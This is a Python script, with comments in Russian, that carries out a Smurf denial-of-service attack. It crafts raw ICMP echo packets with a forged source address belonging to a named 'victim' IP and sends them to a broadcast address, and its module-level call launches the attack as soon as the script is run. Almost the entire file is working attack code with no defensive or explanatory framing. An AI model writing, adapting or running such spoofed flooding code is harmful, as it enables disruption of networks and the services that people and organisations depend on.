import socket
import struct
import time
import random
import sys

# Типы ICMP-сообщений
ICMP_ECHO_REQUEST = 8
ICMP_CODE = 0
TIMEOUT = 2

# IP-заголовок константы
IP_VERSION = 4
IP_IHL = 5
IP_TTL = 64
IP_PROTO_ICMP = socket.IPPROTO_ICMP


def calculate_checksum(source_string):
    count_to = (len(source_string) / 2) * 2
    checksum = 0
    count = 0

    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        checksum = checksum + this_val
        checksum = checksum & 0xffffffff
        count = count + 2

    if count_to < len(source_string):
        checksum = checksum + source_string[len(source_string) - 1]
        checksum = checksum & 0xffffffff

    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = checksum + (checksum >> 16)
    answer = ~checksum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)

    return answer


def create_icmp_packet(identifier):
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, ICMP_CODE, 0, identifier, 1)
    data = struct.pack('d', time.time())
    checksum = calculate_checksum(header + data)
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, ICMP_CODE, socket.htons(checksum), identifier, 1)
    return header + data


def create_ip_header(source_ip, dest_ip):
    ip_ihl_ver = (IP_VERSION << 4) + IP_IHL
    ip_tot_len = 0  # Kernel will fill the correct total length
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = IP_TTL
    ip_proto = IP_PROTO_ICMP
    ip_check = 0  # Kernel will fill the correct checksum
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, 0, ip_tot_len, ip_id, ip_frag_off,
                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    return ip_header


def smurf_attack(target_ip, broadcast_ip):
    try:
        # Создание сырого сокета для ICMP
        icmpsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

        # Включение IP-заголовка и возможности широковещательной передачи
        icmpsocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        icmpsocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        # Подмена IP-адреса источника (жертва)
        icmp_packet = create_icmp_packet(1)
        ip_header = create_ip_header(target_ip, broadcast_ip)

        # Полный пакет
        packet = ip_header + icmp_packet

        # Отправка пакета на широковещательный адрес с использованием sendto, без connect
        icmpsocket.sendto(packet, (broadcast_ip, 0))
        print(f"Пакет отправлен с подмененным IP-адресом {target_ip} на {broadcast_ip}")

    except socket.error as e:
        print(f"Ошибка при отправке: {e}")
        print("Возможно, требуется запустить с правами root!")
        sys.exit(0)

    finally:
        icmpsocket.close()


# Пример использования
target_ip = "192.168.0.156"  # Адрес жертвы
broadcast_ip = "192.168.0.255"  # Широковещательный адрес
smurf_attack(target_ip, broadcast_ip)
